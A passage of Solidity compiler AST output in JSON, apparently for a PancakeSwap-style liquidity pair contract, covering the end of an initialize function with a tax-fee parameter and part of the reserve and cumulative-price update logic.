												"nodeType": "ExpressionStatement",
												"src": "3085:16:6"
											}
										]
									},
									"documentation": null,
									"id": 1178,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "initialize",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1155,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1150,
												"name": "_token0",
												"nodeType": "VariableDeclaration",
												"scope": 1178,
												"src": "2863:15:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1149,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2863:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1152,
												"name": "_token1",
												"nodeType": "VariableDeclaration",
												"scope": 1178,
												"src": "2888:15:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1151,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2888:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1154,
												"name": "_taxfee",
												"nodeType": "VariableDeclaration",
												"scope": 1178,
												"src": "2913:12:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1153,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2913:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2853:78:6"
									},
									"returnParameters": {
										"id": 1156,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2941:0:6"
									},
									"scope": 2224,
									"src": "2834:274:6",
									"stateMutability": "nonpayable",
									"superFunction": 851,
									"visibility": "external"
								},
								{
									"body": {
										"id": 1285,
										"nodeType": "Block",
										"src": "3321:852:6",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 1202,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1195,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1190,
																	"name": "balance0",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1180,
																	"src": "3352:8:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<=",
																"rightExpression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 1193,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "UnaryOperation",
																			"operator": "-",
																			"prefix": true,
																			"src": "3372:2:6",
																			"subExpression": {
																				"argumentTypes": null,
																				"hexValue": "31",
																				"id": 1192,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "3373:1:6",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_1_by_1",
																					"typeString": "int_const 1"
																				},
																				"value": "1"
																			},
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_minus_1_by_1",
																				"typeString": "int_const -1"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_rational_minus_1_by_1",
																				"typeString": "int_const -1"
																			}
																		],
																		"id": 1191,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "3364:7:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint112_$",
																			"typeString": "type(uint112)"
																		},
																		"typeName": "uint112"
																	},
																	"id": 1194,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "3364:11:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																},
																"src": "3352:23:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "&&",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1201,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1196,
																	"name": "balance1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1182,
																	"src": "3379:8:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<=",
																"rightExpression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 1199,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "UnaryOperation",
																			"operator": "-",
																			"prefix": true,
																			"src": "3399:2:6",
																			"subExpression": {
																				"argumentTypes": null,
																				"hexValue": "31",
																				"id": 1198,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "3400:1:6",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_1_by_1",
																					"typeString": "int_const 1"
																				},
																				"value": "1"
																			},
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_minus_1_by_1",
																				"typeString": "int_const -1"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_rational_minus_1_by_1",
																				"typeString": "int_const -1"
																			}
																		],
																		"id": 1197,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "3391:7:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint112_$",
																			"typeString": "type(uint112)"
																		},
																		"typeName": "uint112"
																	},
																	"id": 1200,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "3391:11:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																},
																"src": "3379:23:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "3352:50:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a204f564552464c4f57",
															"id": 1203,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3416:19:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_ecd319b2d162405bd72b657f3fdaddf991823264b7f8c130bf28f20adeb81259",
																"typeString": "literal_string \"Pancake: OVERFLOW\""
															},
															"value": "Pancake: OVERFLOW"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_ecd319b2d162405bd72b657f3fdaddf991823264b7f8c130bf28f20adeb81259",
																"typeString": "literal_string \"Pancake: OVERFLOW\""
															}
														],
														"id": 1189,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2359,
															2360
														],
														"referencedDeclaration": 2360,
														"src": "3331:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1204,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3331:114:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1205,
												"nodeType": "ExpressionStatement",
												"src": "3331:114:6"
											},
											{
												"assignments": [
													1207
												],
												"declarations": [
													{
														"constant": false,
														"id": 1207,
														"name": "blockTimestamp",
														"nodeType": "VariableDeclaration",
														"scope": 1285,
														"src": "3455:21:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														},
														"typeName": {
															"id": 1206,
															"name": "uint32",
															"nodeType": "ElementaryTypeName",
															"src": "3455:6:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint32",
																"typeString": "uint32"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1216,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1214,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 1209,
																	"name": "block",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2346,
																	"src": "3486:5:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_block",
																		"typeString": "block"
																	}
																},
																"id": 1210,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "timestamp",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "3486:15:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "%",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_rational_4294967296_by_1",
																	"typeString": "int_const 4294967296"
																},
																"id": 1213,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"hexValue": "32",
																	"id": 1211,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "3504:1:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_2_by_1",
																		"typeString": "int_const 2"
																	},
																	"value": "2"
																},
																"nodeType": "BinaryOperation",
																"operator": "**",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 1212,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "3509:2:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "3504:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_4294967296_by_1",
																	"typeString": "int_const 4294967296"
																}
															},
															"src": "3486:25:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1208,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "3479:6:6",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint32_$",
															"typeString": "type(uint32)"
														},
														"typeName": "uint32"
													},
													"id": 1215,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3479:33:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3455:57:6"
											},
											{
												"assignments": [
													1218
												],
												"declarations": [
													{
														"constant": false,
														"id": 1218,
														"name": "timeElapsed",
														"nodeType": "VariableDeclaration",
														"scope": 1285,
														"src": "3522:18:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														},
														"typeName": {
															"id": 1217,
															"name": "uint32",
															"nodeType": "ElementaryTypeName",
															"src": "3522:6:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint32",
																"typeString": "uint32"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1222,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													},
													"id": 1221,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1219,
														"name": "blockTimestamp",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1207,
														"src": "3543:14:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"id": 1220,
														"name": "blockTimestampLast",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 978,
														"src": "3560:18:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"src": "3543:35:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3522:56:6"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"id": 1233,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"id": 1229,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint32",
																"typeString": "uint32"
															},
															"id": 1225,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1223,
																"name": "timeElapsed",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1218,
																"src": "3615:11:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint32",
																	"typeString": "uint32"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1224,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "3629:1:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "3615:15:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "&&",
														"rightExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															"id": 1228,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1226,
																"name": "_reserve0",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1184,
																"src": "3634:9:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint112",
																	"typeString": "uint112"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1227,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "3647:1:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "3634:14:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"src": "3615:33:6",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "&&",
													"rightExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"id": 1232,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 1230,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1186,
															"src": "3652:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "!=",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 1231,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3665:1:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "3652:14:6",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "3615:51:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1263,
												"nodeType": "IfStatement",
												"src": "3611:396:6",
												"trueBody": {
													"id": 1262,
													"nodeType": "Block",
													"src": "3668:339:6",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1246,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1234,
																	"name": "price0CumulativeLast",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 980,
																	"src": "3742:20:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 1245,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 1241,
																						"name": "_reserve0",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1184,
																						"src": "3821:9:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint112",
																							"typeString": "uint112"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint112",
																							"typeString": "uint112"
																						}
																					],
																					"expression": {
																						"argumentTypes": null,
																						"arguments": [
																							{
																								"argumentTypes": null,
																								"id": 1238,
																								"name": "_reserve1",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 1186,
																								"src": "3804:9:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint112",
																									"typeString": "uint112"
																								}
																							}
																						],
																						"expression": {
																							"argumentTypes": [
																								{
																									"typeIdentifier": "t_uint112",
																									"typeString": "uint112"
																								}
																							],
																							"expression": {
																								"argumentTypes": null,
																								"id": 1236,
																								"name": "UQ112x112",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 2341,
																								"src": "3787:9:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_type$_t_contract$_UQ112x112_$2341_$",
																									"typeString": "type(library UQ112x112)"
																								}
																							},
																							"id": 1237,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"memberName": "encode",
																							"nodeType": "MemberAccess",
																							"referencedDeclaration": 2322,
																							"src": "3787:16:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_function_internal_pure$_t_uint112_$returns$_t_uint224_$",
																								"typeString": "function (uint112) pure returns (uint224)"
																							}
																						},
																						"id": 1239,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"kind": "functionCall",
																						"lValueRequested": false,
																						"names": [],
																						"nodeType": "FunctionCall",
																						"src": "3787:27:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint224",
																							"typeString": "uint224"
																						}
																					},
																					"id": 1240,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"memberName": "uqdiv",
																					"nodeType": "MemberAccess",
																					"referencedDeclaration": 2340,
																					"src": "3787:33:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_internal_pure$_t_uint224_$_t_uint112_$returns$_t_uint224_$bound_to$_t_uint224_$",
																						"typeString": "function (uint224,uint112) pure returns (uint224)"
																					}
																				},
																				"id": 1242,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "3787:44:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint224",
																					"typeString": "uint224"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_uint224",
																					"typeString": "uint224"
																				}
																			],
																			"id": 1235,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "3782:4:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_uint256_$",
																				"typeString": "type(uint256)"
																			},
																			"typeName": "uint"
																		},
																		"id": 1243,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "3782:50:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "*",
																	"rightExpression": {
																		"argumentTypes": null,
																		"id": 1244,
																		"name": "timeElapsed",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1218,
																		"src": "3851:11:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint32",
																			"typeString": "uint32"
																		}
																	},
																	"src": "3782:80:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "3742:120:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1247,
															"nodeType": "ExpressionStatement",
															"src": "3742:120:6"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1260,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1248,
																	"name": "price1CumulativeLast",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 982,
																	"src": "3876:20:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 1259,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 1255,
																						"name": "_reserve1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1186,
																						"src": "3955:9:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint112",
																							"typeString": "uint112"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint112",
																							"typeString": "uint112"
																						}
																					],
																					"expression": {
																						"argumentTypes": null,
																						"arguments": [
																							{
																								"argumentTypes": null,
																								"id": 1252,
																								"name": "_reserve0",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 1184,
																								"src": "3938:9:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint112",
																									"typeString": "uint112"
																								}
																							}
																						],
																						"expression": {
																							"argumentTypes": [
																								{
																									"typeIdentifier": "t_uint112",
																									"typeString": "uint112"
																								}
																							],
																							"expression": {
																								"argumentTypes": null,
																								"id": 1250,
																								"name": "UQ112x112",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 2341,
																								"src": "3921:9:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_type$_t_contract$_UQ112x112_$2341_$",
																									"typeString": "type(library UQ112x112)"
																								}
																							},
																							"id": 1251,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"memberName": "encode",
																							"nodeType": "MemberAccess",
																							"referencedDeclaration": 2322,
																							"src": "3921:16:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_function_internal_pure$_t_uint112_$returns$_t_uint224_$",
																								"typeString": "function (uint112) pure returns (uint224)"
																							}
																						},
																						"id": 1253,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"kind": "functionCall",
																						"lValueRequested": false,
																						"names": [],
																						"nodeType": "FunctionCall",
																						"src": "3921:27:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint224",
																							"typeString": "uint224"
																						}
																					},
																					"id": 1254,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"memberName": "uqdiv",
																					"nodeType": "MemberAccess",
																					"referencedDeclaration": 2340,
																					"src": "3921:33:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_internal_pure$_t_uint224_$_t_uint112_$returns$_t_uint224_$bound_to$_t_uint224_$",
																						"typeString": "function (uint224,uint112) pure returns (uint224)"
																					}
																				},
																				"id": 1256,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "3921:44:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint224",
																					"typeString": "uint224"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_uint224",
																					"typeString": "uint224"
																				}
																			],
																			"id": 1249,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "3916:4:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_uint256_$",
																				"typeString": "type(uint256)"
																			},
																			"typeName": "uint"
																		},
																		"id": 1257,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "3916:50:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "*",
																	"rightExpression": {
																		"argumentTypes": null,
																		"id": 1258,
																		"name": "timeElapsed",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1218,
																		"src": "3985:11:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint32",
																			"typeString": "uint32"
																		}
																	},
																	"src": "3916:80:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "3876:120:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1261,
															"nodeType": "ExpressionStatement",
															"src": "3876:120:6"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1268,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1264,
														"name": "reserve0",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 974,
														"src": "4016:8:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 1266,
																"name": "balance0",
																"nodeType": "Identifier",
